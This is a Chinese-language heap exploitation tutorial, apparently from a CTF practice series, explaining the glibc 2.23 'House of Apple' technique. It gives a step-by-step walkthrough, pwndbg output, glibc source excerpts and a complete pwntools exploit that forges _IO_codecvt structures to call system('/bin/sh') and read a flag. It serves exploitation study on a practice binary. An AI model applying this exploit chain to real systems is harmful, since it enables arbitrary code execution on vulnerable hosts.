  __write = 0x7f1f7606b9c0,
  __seek = 0x7f1f7606b1f5,
  __close = 0x7f1f7606bc3d,
  __stat = 0x7f1f7606e485,
  __showmanyc = 0x7f1f7606e48b,
  __imbue = 0x0
}
pwndbg> p/x &_IO_wfile_underflow
$3 = 0x7f1f76066561
pwndbg> 
```

在可控的堆内存区域（`chunk0_addr + 0x30`），需要构造一个伪造的 **`_IO_wide_data`** 结构。其中， **`_IO_read_ptr`** 和 **`_IO_read_end`** 两个字段的设置尤为关键，它们直接控制着宽字符流读取路径的逻辑。

**具体设置与目的**：将 `_IO_read_ptr` 设置为 `3`，将 `_IO_read_end` 设置为 `2`。这种 `_IO_read_ptr > _IO_read_end` 的反常状态具有明确的利用意图。

**绕过检查的原理**：在后续的 `_IO_wfile_underflow` 等函数执行路径中，存在条件判断 `if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)`。此检查旨在判断宽字符读缓冲区中是否还有剩余数据可读。由于我们设置了 `3 < 2` 的条件为**假**，该判断无法通过。这使得执行流**不会进入“从现有缓冲区直接读取”的快速返回路径**，从而避免了控制流在此时提前结束或转向非预期的分支。

**利用意义**：此精心策划的“缓冲区状态”确保IO处理逻辑必须继续向下执行，去处理“缓冲区为空”或“需要更多数据”的情况。这迫使控制流继续深入更复杂的IO处理代码，最终按照此前的设计，走向调用`_codecvt`结构中的`__codecvt_do_in`函数指针的预定路径，为触发任意代码执行扫清了又一道路障。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x5a4b9c546030
$4 = {
  _IO_read_ptr = 0x3,
  _IO_read_end = 0x2,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x5a4b9c546128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x5a4b9c546128
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x0
}
pwndbg> 
```

在可控的堆内存地址（`chunk0_addr + 0x200`），需要精心构造一个伪造的 **`_IO_codecvt`** 结构体。这是整个利用链的**最终执行枢纽**，其内部指针将直接决定控制流的最终去向。

**该伪造结构的具体布局与核心作用如下：**

1.  **设置`__codecvt_do_in`函数指针**：将此指针项设置为目标函数的地址。这通常是以下两者之一：
    *   **`system`函数的地址**：用于执行任意系统命令。
    *   一个合适的 **`one_gadget`** 地址：用于直接跳转到libc中一段能够启动shell的现有代码片段。
    *   **作用**：在`_IO_wfile_underflow`函数的执行过程中，当需要执行字符转换时，会调用 **`(*cd->__codecvt_do_in) (cd, ...)`**。由于我们完全控制了`cd`（即指向此伪造结构的指针），此调用将直接跳转到我们预设的`system`或`one_gadget`。

2.  **设置`__codecvt_destr`指针**：将此指针项设置为字符串 **`“/bin/sh”`**。
    *   **作用**：当上述`__codecvt_do_in`被调用时，其第一个参数`cd`正是这个伪造的`_IO_codecvt`结构体的地址。在`system`函数的执行上下文中，`cd`被作为第一个参数（即命令字符串）使用。由于我们在该结构体起始附近布置了`__codecvt_destr`指针并指向`“/bin/sh”`，因此对`system(cd)`的调用等效于`system(“/bin/sh”)`，从而成功获取shell。

**总结**：此步骤是整个利用链的“装弹”阶段。通过在可控内存中精确伪造`_IO_codecvt`结构，并将其关键函数指针和字符串指针指向利用载荷，成功将glibc IO内部一个合法的字符转换调用，转化为一次可靠且可控的任意命令执行。

```bash
pwndbg> p/x *(struct _IO_codecvt*)0x5a4b9c546200
$5 = {
  __codecvt_destr = 0x68732f6e69622f,
  __codecvt_do_out = 0x0,
  __codecvt_do_unshift = 0x0,
  __codecvt_do_in = 0x7f1f7603c3eb,
  __codecvt_do_encoding = 0x0,
  __codecvt_do_always_noconv = 0x0,
  __codecvt_do_length = 0x0,
  __codecvt_do_max_length = 0x0,
  __cd_in = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x5a4b9c546250
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x5a4b9c546250
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  },
  __cd_out = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x5a4b9c546290
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x5a4b9c546290
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  }
}
pwndbg> x/5i 0x7f1f7603c3eb
   0x7f1f7603c3eb <__libc_system>:      sub    rsp,0x8
   0x7f1f7603c3ef <__libc_system+4>:    test   rdi,rdi
   0x7f1f7603c3f2 <__libc_system+7>:    jne    0x7f1f7603c40a <__libc_system+31>
   0x7f1f7603c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7f1f76156d7b
   0x7f1f7603c3fb <__libc_system+16>:   call   0x7f1f7603be36 <do_system>
pwndbg> x/s 0x5a4b9c546200
0x5a4b9c546200: "/bin/sh"
pwndbg> 
```

整个利用链的最终执行，始于一次精心策划的堆分配器错误。如若**再次释放**已位于large bin中的`chunk[0]`，这将立即触发glibc的**双重释放检测**。分配器在`_int_free`函数中识别到该异常，随即调用 **`malloc_printerr`** 函数来处理此错误。

`malloc_printerr`在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 函数，强制刷新所有已打开的IO流。此函数遍历由全局指针`_IO_list_all`管理的IO链表。由于此前通过Large Bin Attack已将该指针成功劫持为指向`chunk[2]`，因此遍历直接从我们伪造的`_IO_FILE_plus`结构开始。

当执行流抵达位于`chunk[2]`的伪造结构时，IO层会根据其`_mode`、`_IO_write_ptr`与`_IO_write_base`等字段进行状态校验。得益于前期的精确布局，该结构被识别为一个需要刷新缓冲区的有效文件流。这一判定导致通过其虚表调用 **`_IO_OVERFLOW`** 函数。

由于我们将伪造结构的虚表指针设置为 **`_IO_wfile_jumps`**，其`_IO_OVERFLOW`条目实际指向该跳转表中的 **`_IO_wfile_underflow`** 函数。至此，控制流被成功地从通用的堆错误处理路径，导入我们预先布置的、针对宽字符流的特定利用链，为后续执行任意代码奠定了关键的基础。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7f1f7606de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wfile_underflow>
        rdi: 0x5a4b9c546940 ◂— 0xffffffffffffffeb
```

当执行流进入 **`_IO_wfile_underflow`** 函数后，其内部存在一系列的状态校验，以决定如何处理这个“下溢”的文件流。由于前期在伪造的`_IO_FILE_plus`及相关结构中进行了**字节级精度的布局**，这些校验被逐一满足，引导控制流向预定的利用终点前进。

1.  **绕过“不可读”标志检查**：函数首先检查 `if (__glibc_unlikely (fp->_flags & _IO_NO_READS))`。我们已将伪造结构的`_flags`字段设置为`0xFFFFFFFFFFFFFFEB`，**此值明确清除了`_IO_NO_READS`标志位**。因此，此项检查顺利通过，确认了该流是可读的。

2.  **绕过宽字符读缓冲区检查**：接着，函数检查宽字符缓冲区是否还有数据，即 `if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)`。我们在伪造的`_IO_wide_data`结构中，将`_IO_read_ptr`设为`3`，`_IO_read_end`设为`2`，使得条件 `3 < 2` **不成立**。这确保了执行流**不会**因为误判缓冲区仍有数据而提前返回，从而被迫继续深入处理逻辑。

3.  **进入关键的窄字符流检查分支**：随后，控制流到达检查 `if (fp->_IO_read_ptr < fp->_IO_read_end)`。我们之前将`_IO_read_end`设置为一个极大值（`0xffffffffffffffff`），而`_IO_read_ptr`通常为`0x411`，因此条件 `0x411 < 0xffffffffffffffff` **恒成立**。这引导执行流进入处理窄字符（`char`）输入的关键分支。在此分支的深处，代码最终会调用关联的`_codecvt`结构中的转换函数。

4.  **触发最终代码执行**：在窄字符处理路径中，代码执行到 **`(*cd->__codecvt_do_in) (cd, ...)`**。此处的`cd`即为我们伪造的`_IO_codecvt`结构的指针。由于我们已将该结构中的`__codecvt_do_in`函数指针设置为`system`的地址，同时将`__codecvt_destr`指针设置为字符串`“/bin/sh”`，因此该调用实际等效于 **`system(“/bin/sh”)`**。

至此，整个复杂而精密的利用链抵达终点：从触发双重释放错误开始，历经IO链表遍历、多层结构伪造、一系列状态检查绕过，最终成功地将控制流导向`system(“/bin/sh”)`，**成功获取了目标系统的shell控制权**。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:157
   151       /* There is more in the external.  Convert it.  */
   152       const char *read_stop = (const char *) fp->_IO_read_ptr;
   153 
   154       fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
   155       fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
   156         fp->_wide_data->_IO_buf_base;
 ► 157       status = (*cd->__codecvt_do_in) (cd, &fp->_wide_data->_IO_state,
   158                                        fp->_IO_read_ptr, fp->_IO_read_end,
   159                                        &read_stop,
   160                                        fp->_wide_data->_IO_read_ptr,
   161                                        fp->_wide_data->_IO_buf_end,
   162                                        &fp->_wide_data->_IO_read_end);
 
 ► 0x7f1f760665fc <_IO_wfile_underflow+155>    call   qword ptr [r12 + 0x18]      <system>
        command: 0x5a4b9c546200 ◂— 0x68732f6e69622f /* '/bin/sh' */
```

### 1-38 house of apple其五

在glibc 2.24版本引入对`_IO_FILE_plus`虚表的严格检查后，**House of Apple**技术的一种演进形式依然能够有效实施。该方法的核心在于，**将堆漏洞提供的任意地址写原语，与glibc内部另一个合法的宽字符IO跳转表（`_IO_wfile_jumps_mmap`）相结合**，并同样通过伪造关键的`_IO_codecvt`结构，构建一条能够绕过vtable验证的完整利用链。

整个利用流程可以清晰地归纳为以下三个递进的阶段：

**第一阶段：建立利用基础——获取任意地址写原语**
首要步骤是利用诸如**Large Bin Attack**的堆漏洞利用技术，获得一次关键的**向任意地址写入可控数据**的能力。此原语的主要目的是劫持全局IO流管理结构，通常通过向关键全局变量`_IO_list_all`写入一个可控的堆地址来实现。这是启动后续所有利用操作不可或缺的前提。

**第二阶段：构建恶意执行环境——伪造IO结构并劫持链表**
利用已获得的任意地址写能力，执行以下核心操作以污染IO子系统：
1.  **劫持全局IO链表头**：将管理所有打开文件流的全局指针`_IO_list_all`，修改为指向在堆上预先布置的伪造`_IO_FILE_plus`结构。
2.  **设置合法虚表以绕过检查**：**（此技术的核心与绕过关键）** 在该伪造的`_IO_FILE_plus`结构中，将其虚表（vtable）指针设置为glibc内部合法的 **`_IO_wfile_jumps_mmap`** 地址。由于此地址位于libc认可的合法vtable内存区域，因此能通过严格的范围验证检查。
3.  **布置完整的伪造数据结构链**：精确设置伪造结构中的各个字段，以精细控制后续的执行逻辑：
    *   将`_IO_FILE_plus`结构内的`_wide_data`指针指向一个伪造的`_IO_wide_data`结构，以满足相关内部函数的非空指针检查。
    *   **关键步骤**：将`_IO_FILE_plus`结构内的`_codecvt`指针指向一个伪造的`_IO_codecvt`结构。在该结构中：
        *   将`__codecvt_do_in`函数指针项设置为最终的利用目标地址（如`system`或`one_gadget`）。
        *   将`__codecvt_destr`指针项设置为字符串`“/bin/sh”`，为`system`函数调用提供参数。
    *   将`_IO_FILE_plus`结构中的`_flags`等字段设置为特定值（例如`0xFFFFFFFFFFFFFFFB`），用以满足后续IO函数执行路径中的各项状态检查，确保流程不被中断。

**第三阶段：触发利用链——引导IO处理流程执行恶意代码**
最终，当程序因调用`abort()`、`exit()`或触发错误处理（如`malloc_printerr`）而执行`_IO_flush_all_lockp`函数时，该函数会遍历被我们污染的IO链表。对于链表中的伪造文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_wfile_jumps_mmap`表中的 **`_IO_wfile_underflow_mmap`** 函数。

控制流进入`_IO_wfile_underflow_mmap`后，在特定的代码路径中，会调用与该流关联的`_codecvt`结构中的转换函数，即执行 **`(*cd->__codecvt_do_in) (cd, ...)`**。由于此前已完全控制该`_IO_codecvt`结构，此调用将直接跳转到预设的`system`函数，并以`__codecvt_destr`所指向的`“/bin/sh”`字符串作为参数，从而最终实现任意代码执行，成功获取shell。

相关glibc完整源码参见[wfileops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/wfileops.c#L394)：

```c
const struct _IO_jump_t _IO_wfile_jumps_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close_mmap),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

struct _IO_codecvt
{
  void (*__codecvt_destr) (struct _IO_codecvt *);
  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,
					     __mbstate_t *,
					     const wchar_t *,
					     const wchar_t *,
					     const wchar_t **, char *,
					     char *, char **);
  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,
						 __mbstate_t *, char *,
						 char *, char **);
  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,
					    __mbstate_t *,
					    const char *, const char *,
					    const char **, wchar_t *,
					    wchar_t *, wchar_t **);
  int (*__codecvt_do_encoding) (struct _IO_codecvt *);
  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);
  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,
			      const char *, const char *, _IO_size_t);
  int (*__codecvt_do_max_length) (struct _IO_codecvt *);

  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};

struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

static wint_t
_IO_wfile_underflow_mmap (_IO_FILE *fp)
{
  struct _IO_codecvt *cd;
  const char *read_stop;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr >= fp->_IO_read_end
      /* No.  But maybe the read buffer is not fully set up.  */
      && _IO_file_underflow_mmap (fp) == EOF)
    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */
    return WEOF;

  /* There is more in the external.  Convert it.  */
  read_stop = (const char *) fp->_IO_read_ptr;

  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
	{
	  free (fp->_wide_data->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_wdoallocbuf (fp);
    }

  fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
  fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
    fp->_wide_data->_IO_buf_base;
  (*cd->__codecvt_do_in) (cd, &fp->_wide_data->_IO_state,
			  fp->_IO_read_ptr, fp->_IO_read_end,
			  &read_stop,
			  fp->_wide_data->_IO_read_ptr,
			  fp->_wide_data->_IO_buf_end,
			  &fp->_wide_data->_IO_read_end);

  fp->_IO_read_ptr = (char *) read_stop;

  /* If we managed to generate some text return the next character.  */
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  /* There is some garbage at the end of the file.  */
  __set_errno (EILSEQ);
  fp->_flags |= _IO_ERR_SEEN;
  return WEOF;
}
```

本方法的成功执行，最终依赖于glibc内部一条从堆管理器错误处理到IO流强制刷新的确定性路径。具体而言，通过触发堆分配器错误（例如，故意再次释放一个已位于large bin中的内存块）来引导程序调用 **`malloc_printerr`** 函数。该函数在处理错误信息时，会调用 **`_IO_flush_all_lockp`**，从而强制刷新所有已打开的IO流缓冲区。

`_IO_flush_all_lockp` 函数会遍历由全局指针 `_IO_list_all` 管理的IO链表，并对链表中的每个文件流调用其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已通过Large Bin Attack将`_IO_list_all`劫持，并插入了一个虚表设置为 **`_IO_wfile_jumps_mmap`** 的伪造`_IO_FILE_plus`结构，因此实际被调用的`_IO_OVERFLOW`函数即为该表中的 **`_IO_wfile_underflow_mmap`**。

**关键函数路径与作用分析：**

1.  **`_IO_wfile_underflow_mmap`函数**：
    *   **正常作用**：此函数是`_IO_wfile_jumps_mmap`虚表中`_IO_OVERFLOW`项的实现，负责处理内存映射文件宽字符流在读取时发生“下溢”（缓冲区无数据）的情况。它会执行一系列检查并尝试填充缓冲区。
    *   **在利用链中的角色**：这是控制流离开常规IO刷新逻辑、进入此前预设陷阱的入口。在执行过程中，该函数会检查并调用与该文件流关联的`_codecvt`（字符集转换）结构中的函数来完成编码转换。

2.  **`__codecvt_do_in`函数指针**：
    *   **正常作用**：这是`_IO_codecvt`结构体中的一个标准函数指针，用于执行从外部多字节序列到内部宽字符的转换。
    *   **在利用链中的角色**：**这是整个利用链的最终跳转点与执行终点**。通过前期布局，已完全控制了伪造的`_IO_codecvt`结构：
        *   将 **`__codecvt_do_in`** 指针设置为目标函数地址（如`system`）。
        *   将 **`__codecvt_destr`** 指针设置为字符串`“/bin/sh”`。
    当`_IO_wfile_underflow_mmap`执行到转换步骤，调用 **`(*cd->__codecvt_do_in) (cd, ...)`** 时，实际调用的是`system(cd)`。由于`cd`是指向伪造`_IO_codecvt`结构的指针，而该结构起始位置附近包含`“/bin/sh”`的`__codecvt_destr`指针，因此成功触发 **`system(“/bin/sh”)`**。

**完整的控制流路径总结**：

因此，从触发堆错误到获得shell的完整控制流路径为：**`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` (`_IO_wfile_underflow_mmap`) → `__codecvt_do_in` (`system`)**。

通过精心布局，将一次堆管理器的错误处理，转化为对全局IO链表的遍历，并利用一个合法的内部跳转表（`_IO_wfile_jumps_mmap`）和可控的转换结构（`_IO_codecvt`），最终可靠地执行了任意命令。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_five/exploit.py)。

核心利用代码如下：

```python
# house of apple five
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_wfile_jumps_mmap = libc.sym["_IO_wfile_jumps_mmap"]
log.info(f"_IO_wfile_jumps_mmap addr: {hex(_IO_wfile_jumps_mmap)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)
# pwndbg> p/x (uint64_t)~0x4
# $1 = 0xfffffffffffffffb
# pwndbg>
payload = b"\x00" * 0x500 + p64(0xFFFFFFFFFFFFFFFB)
edit(1, len(payload), payload)

fake_wide_data = p64(3) + p64(2)
fake_wide_data = fake_wide_data.ljust(0x30, b"\x00") + p64(1)
payload = b"\x00" * 0x20 + fake_wide_data
fake_codecvt = b"/bin/sh\x00"
fake_codecvt = fake_codecvt.ljust(0x18, b"\x00") + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_codecvt
edit(0, len(payload), payload)

fake_io = p64(0xFFFFFFFFFFFFFFFF)
fake_io = fake_io.ljust(0x20 - 0x10, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0x98 - 0x10, b"\x00") + p64(chunk0_addr + 0x200)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0 - 0x10) + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_wfile_jumps_mmap + 0x8)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_five/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在堆漏洞利用的初期阶段，获取目标进程的精确内存布局信息至关重要。一种广泛采用的技术是通过操控空闲堆块在glibc分配器不同容器间的迁移，利用其管理元数据的变化来泄露地址。具体来说，引导一个堆块从**unsorted bin**转移到**large bin**，可以借助large bin独特的指针结构，一次性泄露**libc的基地址**和**堆区域的起始地址**。

**完整的操作流程与核心原理如下：**

1.  **构建初始堆布局**
    首先顺序分配三个堆内存块，分别记为`chunk[0]`、`chunk[1]`和`chunk[2]`。其中`chunk[1]`充当物理隔离块，确保`chunk[0]`与`chunk[2]`在内存中不相邻，防止后续可能的合并操作。一个关键前提是设定`chunk[0]`的尺寸大于`chunk[2]`的尺寸，这保证`chunk[0]`足够大，符合后续被large bin收纳的条件（通常指尺寸不小于1024字节）。

2.  **将目标块置入Unsorted Bin**
    接着释放`chunk[0]`。由于其尺寸超过fast bin的上限且不与top chunk相邻，它会被放入**unsorted bin**——一个暂存空闲块的双向循环链表。此时，分配器将`chunk[0]`的`fd`和`bk`指针改写，指向glibc管理结构`main_arena`内部的特定地址（例如`main_arena+88`或`main_arena+96`）。该地址与libc的加载基址之间存在一个已知的固定偏移。

3.  **触发向Large Bin的转移**
    随后，程序发起一次新的内存分配请求，申请一个尺寸大于`chunk[0]`的新块`chunk[3]`。由于unsorted bin中的`chunk[0]`无法满足此次较大的请求，分配器会对其进行整理。鉴于其较大尺寸，`chunk[0]`被从unsorted bin中移出，并依据其大小插入对应的**large bin**链表。

4.  **捕获Large Bin中的双重指针**
    在large bin链表中，每个空闲块除了维护标准的双向链表指针`fd`和`bk`外，还包含一对特殊的`fd_nextsize`和`bk_nextsize`指针，用于在不同大小的块间快速索引。当`chunk[0]`被放入一个**空的large bin**，或成为该尺寸区间的**首个（或唯一）块**时，其`fd_nextsize`和`bk_nextsize`指针会被初始化为指向其自身的堆内存地址。此刻，`chunk[0]`的元数据中蕴含着两类关键信息：
    *   `fd`与`bk`：指向`main_arena`内部的地址（**关联libc**）。
    *   `fd_nextsize`与`bk_nextsize`：指向`chunk[0]`自身的地址（**即堆地址**）。

5.  **提取并计算核心地址**
    最后，通过程序可能存在的读功能（如`show(0)`）输出`chunk[0]`用户数据区的内容。由于该块处于释放状态，其用户数据区起始部分已被上述管理指针覆盖。从输出中可解析出：
    *   从`fd`或`bk`的值，推算出`main_arena`的地址，减去已知的固定偏移即得到**libc的基址**。
    *   从`fd_nextsize`或`bk_nextsize`的值，直接获得**该堆块所在的堆内存地址**。

通过这一系列模拟正常堆管理行为的精巧操作，无需任何初始地址信息，即可同时获取后续利用所依赖的两个核心地址：libc基址和堆地址，为实施更复杂的利用（如Large Bin Attack）奠定了坚实的基础。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x5dc295926000
Size: 0x430 (with flag bits: 0x431)
fd: 0x7ff16f58df68
bk: 0x7ff16f58df68
fd_nextsize: 0x5dc295926000
bk_nextsize: 0x5dc295926000

Allocated chunk
Addr: 0x5dc295926430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x5dc295926940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x5dc295926d50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x5dc295927260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x5dc295926000 —▸ 0x7ff16f58df68 (main_arena+1096) ◂— 0x5dc295926000
pwndbg> 
```

在成功获取关键的libc与堆内存地址后，利用流程进入关键的构造阶段。接下来，通过将利用**Large Bin Attack**这一强大原语，在单次堆分配操作中实现 **两次独立的任意地址写**，从而为后续的利用链奠定基础。

**具体的实施步骤与原理如下：**

1.  **准备利用载体**：首先释放之前预留的`chunk[2]`。由于其尺寸适中，它将被放入**unsorted bin**，成为后续链表操作中将被转移的“受害者”块（victim）。

2.  **污染Large Bin的链表指针**：利用已掌握的堆上任意写能力，篡改仍位于**large bin**中的`chunk[0]`的两个关键后向指针，将其指向利用目标：
    *   将`chunk[0]`的`bk`（后向）指针修改为`_IO_list_all - 0x10`，目标是劫持全局IO流链表头指针。
    *   将`chunk[0]`的`bk_nextsize`（大尺寸后向）指针修改为`target2`（例如`_IO_list_all - 0x20`或`global_max_fast`），用于向第二个目标地址写入数据。

3.  **通过内存分配触发双重写入**：程序申请一个较大的新堆块`chunk[4]`，其大小必须**同时大于`chunk[2]`和`chunk[0]`的尺寸**。此条件迫使分配器无法直接使用现有空闲块，必须对unsorted bin进行整理。

    在整理过程中，分配器会将`chunk[2]`（victim）从unsorted bin中取出，并依据其大小尝试插入`chunk[0]`所在的large bin链表中。**正是这个插入操作，触发了分配器执行两次关键的链表维护写入**：
    *   **第一次写入（劫持`_IO_list_all`）**：执行链表操作`victim->bk->fd = victim`。由于`victim->bk`已被篡改为`_IO_list_all - 0x10`，此操作的实际效果是向 **`*_IO_list_all`** 写入`victim`（即`chunk[2]`）的堆地址。
